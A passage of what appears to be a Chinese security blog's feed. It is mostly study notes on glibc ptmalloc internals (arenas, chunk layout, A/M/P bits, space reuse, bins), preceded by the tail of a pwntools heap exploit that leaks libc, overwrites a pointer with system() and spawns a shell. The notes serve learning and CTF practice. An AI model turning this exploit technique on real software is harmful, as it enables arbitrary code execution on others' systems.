class="hljs-number">8</span>,chr(<span class="hljs-number">0</span>)))<br>libc_base=<span class="hljs-built_in">result</span>-libc.symbols[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;[*]libc_free:&#x27;</span>+hex(<span class="hljs-built_in">result</span>))<br><span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;[*]libc_base:&#x27;</span>+hex(libc_base))<br>sys_addr=libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;[*]system:&#x27;</span>+hex(sys_addr))<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">24</span>,p64(sys_addr))<br>sleep(<span class="hljs-number">1</span>)<br>dele(<span class="hljs-number">1</span>)<br>p.interactive()<br>os.<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;rm -f pid&quot;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>glic内存管理学习笔记</title>
    <link href="/2019/05/06/glic%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2019/05/06/glic%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>华庭师傅的glibc内存管理简直逆天,这里写一下笔记,更新中</p></blockquote><h1 id="内存经典布局"><a href="#内存经典布局" class="headerlink" title="内存经典布局"></a>内存经典布局</h1><p>这里随便画一下QAQ</p><h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><p>| Kernel| &lt;- 0xc00000000&#x3D;&#x3D;TASK_SIZE<br>|——-|</p><p>|       | &lt;- Random stack offset<br>|——-|</p><table><thead><tr><th>stack</th></tr></thead><tbody><tr><td></td></tr><tr><td>——-</td></tr><tr><td>Memory Mapping region</td></tr><tr><td></td></tr><tr><td>——-</td></tr><tr><td>heap</td></tr><tr><td>——-</td></tr><tr><td>BSS segment</td></tr><tr><td>——-</td></tr><tr><td>Data segment</td></tr><tr><td>——-</td></tr><tr><td>Text segment</td></tr><tr><td>——-</td></tr><tr><td></td></tr></tbody></table><h2 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h2><p>| Kernel| &lt;- 0xFFFF800000000000<br>|——-|</p><p>| undefine region      | &lt;- 0X00007FFFFFFFF000&#x3D;TASK_SIZE<br>|——-|</p><table><thead><tr><th>stack</th></tr></thead><tbody><tr><td></td></tr><tr><td>——-</td></tr><tr><td>Memory Mapping region</td></tr><tr><td></td></tr><tr><td>——-</td></tr><tr><td>heap</td></tr><tr><td>——-</td></tr><tr><td>BSS segment</td></tr><tr><td>——-</td></tr><tr><td>Data segment</td></tr><tr><td>——-</td></tr><tr><td>Text segment</td></tr><tr><td>——-</td></tr><tr><td></td></tr></tbody></table><h1 id="内容设计假设"><a href="#内容设计假设" class="headerlink" title="内容设计假设"></a>内容设计假设</h1><h2 id="6个假设"><a href="#6个假设" class="headerlink" title="6个假设"></a>6个假设</h2><ul><li>对长生命周期的大内存分配使用mmap</li><li>特别大的内存分配总使用mmap</li><li>具有短生命周期的内存分配使用brk</li><li>尽量只缓存临时使用的空闲小内存块</li><li>空闲小内存块只会在malloc和free时合并,free时空闲内存块可能放入pool中,不一定归还给操作系统</li><li>收缩堆的条件<ul><li>当前free块大小加上前后可合并chunk大于64kb</li><li>堆顶大小达到阈值</li><li>这样会把堆最顶端空闲内存返回给操作系统</li></ul></li></ul><h2 id="记忆问题"><a href="#记忆问题" class="headerlink" title="记忆问题"></a>记忆问题</h2><ul><li>收缩堆的条件有?</li><li>结果是?</li><li>都有哪些假设?</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>大内存,长周期 -&gt; mmap</li><li>短周期 -&gt; brk</li><li>缓存的内存块尽可能时大小较小的</li><li>空闲块只有在分配和free的时候会合并</li><li>free的时候不一定归还给操作系统(会成为cache)</li><li>空闲chunk大小 &gt; 64KB 时合并chunk -&gt;收缩堆</li><li>堆顶大小达到阈值 -&gt; 收缩堆</li><li>收缩堆会将堆最顶端空间内存返回给操作系统</li></ul><h1 id="数据结构概述"><a href="#数据结构概述" class="headerlink" title="数据结构概述"></a>数据结构概述</h1><h2 id="Main-arena-与-non-main-arena"><a href="#Main-arena-与-non-main-arena" class="headerlink" title="Main_arena 与 non_main_arena"></a>Main_arena 与 non_main_arena</h2><h3 id="原文概述"><a href="#原文概述" class="headerlink" title="原文概述"></a>原文概述</h3><ul><li>在 Doug Lea 实现的内存分配器中只有一个主分配区（main arena）</li><li>每次分配内存都必须对主分配区加锁，分配完成后释放锁</li><li>在 SMP 多线程环境下，对主分配区的锁的争用很激烈，严重影响了malloc 的分配效率。于是Wolfram Gloger 在 Doug Lea 的基础上改进使得 Glibc 的malloc 可以支持多线程，增加了非主分配区（non main arena）支持</li><li>主分配区与非主分配区用环形链表进行管理。每一个分配区利用互斥锁（mutex）使线程对于该分配区的访问互斥。 </li><li>每个进程只有一个主分配区，但可能存在多个非主分配区</li><li>ptmalloc 根据系统对分配区的争用情况动态增加非主分配区的数量，分配区的数量一旦增加，就不会再减少了。</li><li>主分配 区可以访问进程的heap区域和mmap映射区域</li><li>主分配区可以使用 sbrk 和mmap 向操作系统申请虚拟内存。而非主分配区只能访问进程的 mmap 映射区域</li><li>非主分配区每次使用mmap()向操作系统“批发”HEAP_MAX_SIZE（32 位系统上默认为 1MB，64 位系统默 认为 64MB）大小的虚拟内存</li><li>当用户向非主分配区请求分配内存时再切割成小块“零售” 出去</li><li>ptmalloc 在必要的情况下才会调用mmap()函数向操作系统申请虚拟内存。 </li><li>主分配区可以访问 heap 区域，如果用户不调用 brk()或是 sbrk()函数，分配程序就可以保证分配到连续的虚拟地址空间，因为每个进程只有一个主分配区使用 sbrk()分配 heap 区域的虚拟内存。</li><li>内核对 brk 的实现可以看着是mmap 的一个精简版，相对高效一些。</li><li>如果主 分配区的内存是通过mmap()向系统分配的，当free该内存时，主分配区会直接调用munmap() 将该内存归还给系统。 </li><li>当某一线程需要调用malloc()分配内存空间时，该线程先查看线程私有变量中是否已经存在一个分配区，如果存在，尝试对该分配区加锁，如果加锁成功，使用该分配区分配内存， 如果失败，该线程搜索循环链表试图获得一个没有加锁的分配区。如果所有的分配区都已经 加锁那么malloc()会开辟一个新的分配区，把该分配区加入到全局分配区循环链表并加锁， 然后使用该分配区进行分配内存操作。在释放操作中，线程同样试图获得待释放内存块所在 分配区的锁，如果该分配区正在被别的线程使用，则需要等待直到其他线程释放该分配区的 互斥锁之后才可以进行释放操作。 </li><li>申请小块内存时会产生很多内存碎片，ptmalloc 在整理时也需要对分配区做加锁操作。</li><li>每个加锁操作大概需要 5～10 个 cpu 指令，而且程序线程很多的情况下，锁等待的时间就会 延长，导致malloc性能下降。一次加锁操作需要消耗100ns左右，正是锁的缘故，导致ptmalloc 在多线程竞争情况下性能远远落后于 tcmalloc。最新版的 ptmalloc 对锁进行了优化，加入了 PER_THREAD和 ATOMIC_FASTBINS 优化，但默认编译不会启用该优化，这两个对锁的优化应 该能够提升多线程内存的分配的效率。</li></ul><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ul><li>该结构有什么特点?</li><li>主分配区和非主分配区的区别是什么?</li><li>两者不同的分配方式分别时如何分配的?</li></ul><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ul><li>main_arena(MA)为主分配区;non_main_arena(N_MA)为非主分配区</li><li>两者通过环形链表进行管理,每个分区采用互斥锁使线程的访问互斥</li><li>每个分配区有一个MA,可能有多个N_MA;</li><li>N_MA数里只加不减</li><li>MA可访问进程的heap和mmap映射区域<ul><li>MA可以使用Sbrk和mmap来向系统申请内存</li><li>N_MA只能访问进程的MMAP映射区域</li></ul></li><li>主分配区可访问heap区域,若用户不调用brk()&#x2F;sbrk(),将可分配到连续的虚拟内存地址</li><li>malloc时先看线程是否有分配区,存在则先加锁,成功则分配内存,否则开辟新分配区,加入环形链表并加锁</li></ul><h2 id="chunk的组织"><a href="#chunk的组织" class="headerlink" title="chunk的组织"></a>chunk的组织</h2><blockquote><p>不管内存是在哪里被分配的，用什么方法分配，用户请求分配的空间在 ptmalloc 中都使用一个 chunk 来表示。用户调用 free()函数释放掉的内存也并不是立即就归还给操作系统， 相反，它们也会被表示为一个chunk，ptmalloc使用特定的数据结构来管理这些空闲的chunk</p></blockquote><h3 id="chunk格式"><a href="#chunk格式" class="headerlink" title="chunk格式"></a>chunk格式</h3><h4 id="使用中的chunk"><a href="#使用中的chunk" class="headerlink" title="使用中的chunk"></a>使用中的chunk</h4><p>|Size of pre chunk| &lt;-chunk<br>|——-|<br>|Size of chunk,in bytes A&#x2F;M&#x2F;P|<br>|——-|  &lt;-mem<br>|user data|<br>|——-| &lt;- next chunk<br>|Size of chunk,in bytes|</p><ul><li>在图中，chunk指针指向一个chunk的开始，一个chunk中包含了用户请求的内存区域和相关的控制信息。</li><li>图中的mem指针才是真正返回给用户的内存指针。</li><li>chunk的第二个域的最低一位为P，它表示前一个块是否在使用中，P为0则表示前一个chunk为空闲，这时 chunk的第一个域prev_size才有效</li><li>prev_size表示前一个chunk的size，程序可以使用这个值来找到前一个chunk的开始地址。当P为1时，表示前一个chunk正在使用中，prev_size无效，程序也就不可以得到前一个chunk的大小。不能对前一个chunk进行任何操作。ptmalloc分配的第一个块总是将P设为1，以防止程序引用到不存在的区域。</li><li>Chunk的第二个域的倒数第二个位为M，他表示当前chunk是从哪个内存区域获得的虚拟内存。M为1表示该chunk是从mmap映射区域分配的，否则是从heap区域分配的。</li><li>Chunk的第二个域倒数第三个位为A，表示该chunk属于主分配区或者非主分配区，如果属于非主分配区，将该位置为1，否则置为0。</li></ul><h4 id="空闲的chunk"><a href="#空闲的chunk" class="headerlink" title="空闲的chunk"></a>空闲的chunk</h4><p>|Size of pre chunk| &lt;-chunk<br>|——-|<br>|Size of chunk,in bytes A&#x2F; &#x2F;P|<br>|——-|  &lt;-mem<br>| *fd   |<br>| *bk   |<br>|*fd_next size|<br>|*bk_next size|<br>|user data|<br>|——-| &lt;- next chunk<br>|Size of chunk,in bytes|</p><ul><li>当chunk空闲时，其M状态不存在，只有AP状态，</li><li>原本是用户数据区的地方存储了四个指针，指针fd指向后一个空闲的chunk，而bk指向前一个空闲的chunk，ptmalloc通过这两个指针将大小相近的chunk连成一个双向链表。</li><li>对于large bin中的空闲chunk，还有两个指针，fd_nextsize和bk_nextsize，这两个指针用于加快在large bin中查找最近匹配的空闲chunk。不同的chunk链表又是通过bins或者fastbins来组织的</li></ul><h3 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h3><ul><li>使用中的chunk和空闲时有什么不同?</li><li>chunk的第二个域倒数几位都各自代表了什么?</li><li>两者各自域都代表了什么?</li></ul><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><h4 id="chunk-in-use"><a href="#chunk-in-use" class="headerlink" title="chunk in use"></a>chunk in use</h4><ul><li>chunk指针指向chunk的开始,但是mem指针才是返回给用户的内存指针</li><li>chunk第二个域的倒数三位代表<ul><li>A -&gt; 是不是主分配区 . <ul><li>0-&gt; MA ;</li><li>1-&gt; N_MA;</li></ul></li><li>M -&gt; 是不是由mmap分配的<ul><li>0-&gt; heap </li><li>1-&gt; mmap;</li></ul></li><li>P -&gt; 前一个chunk是否在使用中  <ul><li>0-&gt; 空闲 此时prev_size有效</li><li>1-&gt; 使用中, 此时禁止对前一个chunk有任何操作,无法得到其大小</li></ul></li></ul></li></ul><h4 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a>free chunk</h4><ul><li>chunk空闲时,M态不存在,只有AP状态</li><li>此时用户区存储了四个指针<ul><li>fd :指向后一个空闲的chunk</li><li>bk :指向前一个空闲的chunk</li><li>fd_nextsize :只有在large bin中才使用,因为相同大小的chunk可能有很多,因此为了方便查找,会指向后一个比他小的chunk</li><li>bk_nextsize :上同,但是会指向前一个比他小的chunk</li></ul></li></ul><h2 id="chunk的空间复用"><a href="#chunk的空间复用" class="headerlink" title="chunk的空间复用"></a>chunk的空间复用</h2><h3 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h3><ul><li>为了使得 chunk 所占用的空间最小，ptmalloc使用了空间复用</li><li>一个 chunk或者正在被使用，或者已经被free掉，所以chunk的中的一些域可以在使用状态和空闲状态表示不同的意义，来达到空间复用的效果。</li><li>以32位系统为例，<ul><li>空闲时，一个chunk中至少需要4个size_t（4B）大小的空间，用来存储prev_size，size，fd和bk （见上图），也就是16B，chunk的大小要对齐到8B。</li><li>当一个chunk处于使用状态时，它的下一个chunk的prev_size域肯定是无效的。所以实际上，这个空间也可以被当前chunk使用</li><li>故而实际上，一个使用中的chunk的大小的计算公式应该是：in_use_size &#x3D; (用户请求大小+ 8 - 4 ) align to 8B，这里加8是因为需要存储prev_size和size，但又因为向下一个chunk“借”了4B，所以要减去4。</li><li>最后，因为空闲的chunk 和使用中的chunk使用的是同一块空间。所以肯定要取其中最大者作为实际的分配空间。即最终的分配空间chunk_size &#x3D; max(in_use_size, 16)。</li><li>这就是当用户请求内存分配时，ptmalloc 实际需要分配的内存大小，在后面的介绍中。如果不是特别指明的地方，指的都是这个经过转换的实际需要分配的内存大小，而不是用户请求的内存分配大小。</li></ul></li></ul><h3 id="问题-2"><a href="#问题-2" class="headerlink" title="问题"></a>问题</h3><ul><li>如何空间复用?</li><li>用户请求分配内存后会实际得到多少内存?</li></ul><h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><ul><li>P为1时,pre chunk size归上一个 chunk使用</li><li>size of(chunk in use )&#x3D;(用户请求大小 + 8 -4 ) align to 8B</li><li>size of (free)min &#x3D;16B</li></ul><h2 id="空闲chunk容器"><a href="#空闲chunk容器" class="headerlink" title="空闲chunk容器"></a>空闲chunk容器</h2><h3 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h3><p>用户free掉的内存并不是都会马上归还给系统，ptmalloc会统一管理heap和mmap映射区域中的空闲的chunk，当用户进行下一次分配请求时，ptmalloc会首先试图在空闲的chunk中挑选一块给用户，这样就避免了频繁的系统调用，降低了内存分配的开销。ptmalloc将相似大小的chunk用双向链表链接起来，这样的一个链表被称为一个bin。Ptmalloc一共维护了128个bin，并使用一个数组来存储这些bin<br><img src="data:image/png;base64,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